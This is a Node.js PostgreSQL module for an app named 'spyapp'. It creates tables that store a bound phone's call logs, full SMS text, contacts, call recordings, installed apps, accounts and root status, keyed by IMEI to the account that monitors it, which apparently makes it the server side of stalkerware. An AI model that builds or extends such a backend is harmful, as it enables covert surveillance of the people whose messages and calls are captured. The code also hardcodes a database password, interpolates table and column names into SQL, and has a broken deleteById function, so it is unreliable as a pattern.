const pg = require('pg');

// CREATE DATABASE MANUALY BEFORE THIS
const pool = new pg.Pool({
  user: 'postgressamd',
  host: '127.0.0.1',
  database: 'spyapp',
  password: 'postgressamd',
  port: '5432'
});
// USE POOL FOR MULTIPLE QUERIES

// uniquein ensures no duplicates
// UNIQUEIN WILL BE USER_ID PLUS ITEM TIMESTUMP OR ANYTHING IE FOR CONTACT WOULD BE (USER_ID+ADDRESS)
// THIS STATEMENT FOREIGN KEY (user_id) REFERENCES users (user_id) ON DELETE CASCADE
// IF USER DELETES ACCOUNT, ALL DATA RELATED TO USER_ID SHOULD BE DELETED
// IF USER DELETES DEVICE, ALL DATA RELATED TO device_unique_id SHOULD BE DELETED
// USER_ID ON EACH TABLE WILL ENSURE EVEN IF THE USER IS AUTH THEY DONT HAVE ACCESS TO OTHER DATA

const userTable = `CREATE TABLE IF NOT EXISTS users (
    user_id serial PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL, 
    email VARCHAR(255) UNIQUE NOT NULL,
    password VARCHAR(255) NOT NULL,
    approval BOOLEAN, 
	  created_on VARCHAR(100) NOT NULL,
    last_seen VARCHAR(100) 	
 )`;

const callLogsTable = `CREATE TABLE IF NOT EXISTS devices_call_logs (
    id serial PRIMARY KEY,
    calllog_id INT NOT NULL,
    address VARCHAR(50) NOT NULL, 
    type VARCHAR(50) NOT NULL,
    date VARCHAR(100) NOT NULL,
    duration BIGINT,
    contact VARCHAR(50) NOT NULL,
    uniquein VARCHAR(255) UNIQUE NOT NULL,
    device_unique_id VARCHAR(100) NOT NULL,
    user_id INT NOT NULL,
    FOREIGN KEY (user_id) REFERENCES users (user_id) ON DELETE CASCADE,
    FOREIGN KEY (device_unique_id) REFERENCES devices (device_unique_id) ON DELETE CASCADE

 )`;

const contactTable = `CREATE TABLE IF NOT EXISTS devices_contacts (
    id serial PRIMARY KEY,
    contact_id INT NOT NULL,
    contact VARCHAR(50) NOT NULL,
    photo TEXT,
    email VARCHAR(255),
    address VARCHAR(50) NOT NULL,
    last_contacted VARCHAR(100) NOT NULL,
    times_contacted INT, 
    uniquein VARCHAR(255) UNIQUE NOT NULL,
    device_unique_id VARCHAR(100) NOT NULL,
    user_id INT NOT NULL,
    FOREIGN KEY (user_id) REFERENCES users (user_id) ON DELETE CASCADE,
    FOREIGN KEY (device_unique_id) REFERENCES devices (device_unique_id) ON DELETE CASCADE
 )`;

const messagesTable = `CREATE TABLE IF NOT EXISTS devices_messages (
    id serial PRIMARY KEY,
    message_id INT NOT NULL,
    address VARCHAR(50) NOT NULL,
    type VARCHAR(50) NOT NULL,
    date VARCHAR(100) NOT NULL,
    message TEXT NOT NULL,
    read_status BOOLEAN, 
    thread_id INT NOT NULL, 
    contact VARCHAR(50) NOT NULL,
    uniquein VARCHAR(255) UNIQUE NOT NULL,
    device_unique_id VARCHAR(100) NOT NULL,
    user_id INT NOT NULL,
    FOREIGN KEY (user_id) REFERENCES users (user_id) ON DELETE CASCADE,
    FOREIGN KEY (device_unique_id) REFERENCES devices (device_unique_id) ON DELETE CASCADE
 )`;

const callRecordingsTable = `CREATE TABLE IF NOT EXISTS devices_call_recordings (
    id serial PRIMARY KEY,
    callrecording_id INT NOT NULL,
    contact VARCHAR(50) NOT NULL,
    address VARCHAR(50) NOT NULL,
    type VARCHAR(50) NOT NULL,
    date VARCHAR(100) NOT NULL,
    duration BIGINT,
    record_file VARCHAR(255) NOT NULL,
    uniquein VARCHAR(255) UNIQUE NOT NULL,
    device_unique_id VARCHAR(100) NOT NULL,
    user_id INT NOT NULL,
    FOREIGN KEY (user_id) REFERENCES users (user_id) ON DELETE CASCADE,
    FOREIGN KEY (device_unique_id) REFERENCES devices (device_unique_id) ON DELETE CASCADE
 )`;

const devicesTable = `CREATE TABLE IF NOT EXISTS devices (
    id serial PRIMARY KEY,
    imei VARCHAR(50) UNIQUE NOT NULL,
    device VARCHAR(50), 
    bind_name VARCHAR(50) NOT NULL,
    bind_date VARCHAR(100) NOT NULL,
    device_unique_id VARCHAR(100) UNIQUE NOT NULL,
    user_id INT NOT NULL,
    FOREIGN KEY (user_id) REFERENCES users (user_id) ON DELETE CASCADE
 )`;

// USE INSERT FIRST UPDATE AFTER TO OVERIDE PREVIOUS
const devicesInfoTable = `CREATE TABLE IF NOT EXISTS devices_info (
    id serial PRIMARY KEY,
    device_charge VARCHAR(50),
    connect_mode VARCHAR(50),
    last_wifi TEXT,
    ring_mode INT, 
    manufacturer VARCHAR(50), 
    model VARCHAR(50), 
    root TEXT,
    internal_sd TEXT,
    external_sd TEXT,
    phone_information TEXT,
    network_information TEXT,
    hardware_information TEXT,
    sensor_information TEXT,
    accounts TEXT,
    last_seen VARCHAR(100), 	
    device_unique_id VARCHAR(100) UNIQUE NOT NULL,
    user_id INT NOT NULL,
    FOREIGN KEY (user_id) REFERENCES users (user_id) ON DELETE CASCADE,
    FOREIGN KEY (device_unique_id) REFERENCES devices (device_unique_id) ON DELETE CASCADE
 )`;

// USE INSERT FIRST UPDATE AFTER TO OVERIDE PREVIOUS
const devicesAppsTable = `CREATE TABLE IF NOT EXISTS devices_apps (
    id serial PRIMARY KEY,
    app TEXT NOT NULL,
    type VARCHAR(50),
    image TEXT NOT NULL,
    last_seen VARCHAR(100), 	
    device_unique_id VARCHAR(100) NOT NULL,
    user_id INT NOT NULL,
    FOREIGN KEY (user_id) REFERENCES users (user_id) ON DELETE CASCADE,
    FOREIGN KEY (device_unique_id) REFERENCES devices (device_unique_id) ON DELETE CASCADE
 )`;

const devicesSettingsTable = `CREATE TABLE IF NOT EXISTS devices_settings (
    id serial PRIMARY KEY,
    server_talk_interval INT,
    device_unique_id VARCHAR(100) UNIQUE NOT NULL,
    user_id INT NOT NULL,
    FOREIGN KEY (user_id) REFERENCES users (user_id) ON DELETE CASCADE,
    FOREIGN KEY (device_unique_id) REFERENCES devices (device_unique_id) ON DELETE CASCADE
 )`;


// ADD TABLES TO AN OBJECT THEN LOOP WHILE ADDING EACH
const tableQuerys = {
  users: userTable,
  callLogs: callLogsTable,
  contacts: contactTable,
  messages: messagesTable,
  call_recordings: callRecordingsTable,
  devices: devicesTable,
  device_info: devicesInfoTable,
  device_apps: devicesAppsTable,
  device_settings: devicesSettingsTable
};

const createTables = () => {
  Object.values(tableQuerys).forEach(val => {
    pool.query(val, (err, _result) => {
      if (err) {
        console.log(err);
      }
    });
  });
  try { pool.end } catch (e) { }
};

// INSERT FUCTION FOR NEW QUERIES REUSABLE FUNCTION WILL RETURN INSERT
const insert = async function (tablename, obj) {
  const keys = Object.keys(obj);
  const dollar = keys.map(function (_item, idx) { return '$' + (idx + 1); });
  const values = [...Object.values(obj)];
  let queryString = `INSERT INTO ${tablename} (${keys}) VALUES (${dollar}) RETURNING *`;
  try {
    const result = await pool.query(queryString, values);
    return result.rows;
  } catch (e) {
    console.log(e)
    return null;
  }
};

// DELETE FUCTION FOR NEW QUERIES REUSABLE FUNCTION SINCE EVERY ITEM HAS ID 
const deleteById = async function (tablename, id) {
  let queryString = await pool.query(`DELETE FROM ${tablename} WHERE id=$1`, [id]);
  try {
    const result = await pool.query(queryString, values);
    return result.rows;
  } catch (e) {
    return null;
  }
};

const update = async (tableName, where, where_id, obj) => {
  const fields = Object.keys(obj).map((field, index) => `${field}=$${index + 2}`).join(', ');
  const values = [where_id, ...Object.values(obj)];
  const query = `UPDATE ${tableName} SET ${fields} WHERE ${where} = $1 RETURNING *`;
  const results = await pool.query(query, values)
    .catch();
  return results.rows;
};

module.exports.createTables = createTables;
module.exports.insert = insert;
module.exports.deleteById = deleteById;
module.exports.update = update;
module.exports.pool = pool;
